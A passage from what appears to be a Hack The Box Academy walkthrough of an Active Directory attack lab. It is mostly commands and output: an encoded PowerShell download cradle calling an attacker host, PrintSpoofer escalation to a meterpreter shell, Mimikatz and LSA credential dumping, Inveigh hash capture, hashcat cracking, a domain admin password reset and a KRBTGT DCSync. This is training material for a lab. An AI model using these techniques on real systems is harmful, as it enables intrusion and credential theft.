[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA
```

Then, students will run the encoded PowerShell payload from the `xp_cmdshell` `PrintSpoofer`:

```sql
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
```


```sql
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                   
```

When students check the terminal, they will see a `meterpreter` session verifying SYSTEM privileges:

```shell-session
[*] 172.16.7.60      web_delivery - Delivering AMSI Bypass (1375 bytes)
[*] 172.16.7.60      web_delivery - Delivering Payload (3692 bytes)
[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.60:53991 ) at 2022-11-29 13:06:07 -0500

[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > shell
Process 4076 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

nt authority\system
```

Using the privileges of the super user, students will need to extract passwords from memory using `mimikatz.exe`, however first, it must be transferred to the jump-box:


```shell
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz64.exe
scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
```

```shell-session
┌─[us-academy-2]─[10.10.14.69]─[htb-ac594497@htb-n7rjfuoj2q]─[~]
└──╼ [★]$ cp /usr/share/mimikatz/x64/mimikatz.exe mimikatz64.exe

┌─[us-academy-2]─[10.10.14.69]─[htb-ac594497@htb-n7rjfuoj2q]─[~]
└──╼ [★]$ scp mimikatz64.exe htb-student@10.129.207.199:/home/htb-student/Desktop

htb-student@10.129.207.199's password: 
mimikatz64.exe                                                                         100% 1279KB   2.1MB/s   00:00    
```

Then, using the meterpreter session, students can upload it to the SQL01 machine:


```shell
upload mimikatz64.exe
```

```shell-session
(Meterpreter 1)(C:\) > upload mimikatz64.exe

[*] uploading  : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] uploaded   : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
```

Now, LSA passwords can be extracted using `mimikatz`'s `sekurlsa::logonpasswords`:

```shelll
shell
mimikatz64.exe
privilege::debug
sekurlsa::logonpasswords
```

```shell-session
(Meterpreter 1)(C:\) > shell

Process 2608 created.
Channel 9 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>mimikatz64.exe
mimikatz64.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 213027 (00000000:00034023)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/12/2022 8:20:40 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : Sup3rS3cur3maY5ql$3rverE
```

The cleartext password for `mssqlsvc` is revealed to be `Sup3rS3cur3maY5ql$3rverE`.

Alternatively, students can run `crackmapexec` as the local administrator to find the cleartext password on the Parrot OS jump-box:

```shell
sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
```

```shell-session
┌─[✗]─[htb-student@skills-par01]─[~/Desktop]
└──╼ $ sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa

SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] SQL01\administrator:Welcome1 (Pwn3d!)
SMB         172.16.7.60     445    SQL01            [+] Dumping LSA secrets
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#30376b08e0552233fba8af8e0be0fb13
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT.LOCAL/mssqlsvc:$DCC2$10240#mssqlsvc#7fd9a156f003adec1eed9c9e1165b973
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aes256-cts-hmac-sha1-96:613dcc03b3d52a10ddfc497787467a6b894766df76d3314569f25c989e3853d0
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aes128-cts-hmac-sha1-96:8f0ee56c9a5003f1f7abb72336503eb1
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:des-cbc-md5:e5f1164a40c77c38
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:plain_password_hex:460742dd3a79d239073f5dbd09481d23a44adbda93b910122f230cb3188249f938e8089cf26623a0fcd3b17e93492e000c27e29093c5d1b9cf7ea2de23419e1b9f8d2cbc5663f23df904e5695461bf42f07acfabceb483c2d2dfe37d80df194655ab925534b4a72ef7aa7602930aebd8b7835fe866142cbd00bf7d2b7710e1cc7fde4cd304a3fa524efea6a67e4a78abdad7b7cf9a64e32f9b414fadaab1d626db252f29a5febba4a3b8d0731eb17579be86d149352e0fb0d7334566298a73d9a6e2b2b6c088c14779b3e91a2cfaca15fb8e77146430eb4da22bba00db61081a97acb0355ea888e0b87ee3edf270a5c8
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aad3b435b51404eeaad3b435b51404ee:6b33b7296ea476ffd8479416bc322a7e:::
SMB         172.16.7.60     445    SQL01            dpapi_machinekey:0x97b7061765871cd4f916f138e8188ff43830deb6
dpapi_userkey:0x0d9f2fafc12db65450e57f928bb671a1e1b3d764
SMB         172.16.7.60     445    SQL01            NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.7.60     445    SQL01            [+] Dumped 9 LSA secrets to /root/.cme/logs/SQL01_172.16.7.60_2022-11-29_140723.secrets and /root/.cme/logs/SQL01_172.16.7.60_2022-11-29_140723.cached
```

The hex string can be decoded to reveal the password `Sup3rS3cur3maY5ql$3rverE`.

Students need to move laterally to the next machine, authenticating to 172.16.7.50 as `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`:

```shell
xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution
```

```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution

[14:19:10:413] [4707:4708] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
<SNIP>
```

At last, students can read the flag file "flag.txt", which is under `C:\Users\Administrator\Desktop\`:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_24.png)

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 9

### "Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?"

Students need to download `Inveigh.ps1` and transfer it over to MS01:


```shell
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
```

```shell-session
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
Inveigh.ps1                                                                            100%  296KB 779.6KB/s   00:00                 
```

Once the `Inveigh.ps1` is on the Windows host, it can be imported and invoked:


```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell-session
PS C:\Users\mssqlsvc\Desktop> Import-Module .\Inveigh.ps1
PS C:\Users\mssqlsvc\Desktop> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-11-29T14:24:15
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.7.50
[+] Spoofer IP Address = 172.16.7.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled

<SNIP>

[*] Press any key to stop console output
[+] [2022-11-29T14:24:27] TCP(445) SYN packet detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) negotiation request detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLM challenge F8059BA109C97E0D sent to 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):51009:
CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

After waiting for a while, students will capture the hash `CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000` via a poisoned response for the user `CT059`.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 10

### "Crack this user's password hash and submit the cleartext password as your answer."

Students need to crack the user's password using `Hashcat` utilizing hashmode 5600, to find the cleartext to be `charlie1`:


```shell
hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz 
```

```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.1.1) starting...

<SNIP>

CT059::INLANEFREIGHT:1f36b2281ab74fb6:57920a050e98f738a02b4cc9e8d3999e:01010000000000006aedd4903558d801a1ae95c7d4aefe1b0000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006aedd4903558d80106000400020000000800300030000000000000000000000000200000dd9dc6dae2b5fe8ff3572953b532f894c0d82985b47fafe105a3f8c1342f89190a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1

<SNIP>
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 11

### "Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host."

Students need to authenticate as `CT059:charlie1` to `172.16.7.50`:

```shell
xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution
```

```shell-session
┌─[✗]─[htb-student@skills-par01]─[~/Desktop]
└──╼ $xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution

[15:39:52:533] [2333:2334] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:39:52:533] [2333:2334] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[15:39:52:533] [2333:2334] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Now, students must refer to the `Bloodhound` data to identify the final phase of the attack chain. The CT059 user has `GenericAll` rights over the Domain Admins group:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_25.png)

`Bloodhound` also provides instructions on how to abuse this misconfiguration using `PowerView` `cmdlets`:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_26.png)

Using these steps, students can add the `CT059` user to the Domain Administrators group or alternatively change the administrator's password to `Welcome1`:

```powershell
net user administrator Welcome1 /domain
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\CT059> net user Administrator Welcome1 /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

The command completed successfully.
```

Now, students have the password for Domain Administrator; thereafter, students can obtain the flag using a number of ways, `wmiexec.py` will be used to connect to DC01 and print out the flag file:

```shell
wmiexec.py administrator@172.16.7.3
type C:\Users\administrator\desktop\flag.txt
```

```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $wmiexec.py administrator@172.16.7.3

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>type C:\Users\administrator\desktop\flag.txt

acLs_f0r_th3_w1n!
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 12

### "Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise."

Students need to `DCSync` the KRBTGT NTLM hash with `secretsdump.py`, finding it to be `7eba70412d81c1cd030d72a3e8dbe05f`:


```shell
secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
```


```shell-session
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
krbtgt:des-cbc-md5:e0a7fbc176c28a37
[*] Cleaning up... 
```

Answer: {hidden}